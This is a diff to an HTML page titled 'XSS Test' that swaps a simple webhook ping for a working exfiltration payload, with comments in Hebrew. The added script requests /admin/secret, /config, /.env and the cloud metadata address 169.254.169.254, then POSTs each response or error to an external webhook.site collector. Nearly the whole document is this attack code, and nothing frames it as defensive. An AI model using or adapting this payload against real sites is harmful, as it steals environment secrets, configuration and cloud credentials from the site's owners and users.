@@ -4,7 +4,41 @@
     <title>XSS Test</title>
   </head>
   <body>
-    <script>fetch("https://webhook.site/989c0c80-3c8d-4425-a211-b236e895afb1");
-    </script>
+ <script>
+  // רשימת ה-URLs לנסות לגשת אליהם
+  const urls = [
+    '/admin/secret',
+    '/config',
+    '/.env',
+    'http://169.254.169.254/latest/meta-data/'
+  ];
+
+  // כתובת ה-webhook שאליה נשלח את התוצאות
+  const webhook = 'https://webhook.site/989c0c80-3c8d-4425-a211-b236e895afb1';
+
+  async function fetchAll() {
+    for (const url of urls) {
+      try {
+        const response = await fetch(url);
+        const text = await response.text();
+
+        await fetch(webhook, {
+          method: 'POST',
+          headers: { 'Content-Type': 'text/plain' },
+          body: `URL: ${url}\n\n${text}`
+        });
+      } catch (error) {
+        await fetch(webhook, {
+          method: 'POST',
+          headers: { 'Content-Type': 'text/plain' },
+          body: `URL: ${url}\n\nError: ${error.message}`
+        });
+      }
+    }
+  }
+
+  fetchAll();
+</script>
+
   </body>
 </html>
